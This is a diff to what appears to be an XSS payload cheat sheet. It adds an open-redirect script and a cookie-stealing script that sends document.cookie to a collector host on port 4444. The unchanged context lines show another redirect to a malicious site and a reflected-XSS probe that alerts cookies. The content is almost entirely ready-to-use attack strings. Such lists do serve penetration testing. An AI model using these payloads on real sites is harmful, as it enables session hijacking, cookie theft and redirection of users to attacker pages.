@@ -63,6 +63,10 @@ function handleResponse() {
 
 `<script> window.location.href = 'https://malicious-site.com'; </script>`  Open Redirect via XSS
 
+`<script> window.location.replace("www.google.com");</script>`  Open Redirect via XSS
+
+`<script>new Image().src='http://0.0.0.0:4444/?cookie=' + encodeURI(document.cookie);</script>` - Stealing Cookie via XSS
+
 ---
 
 `>>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta` reflected input
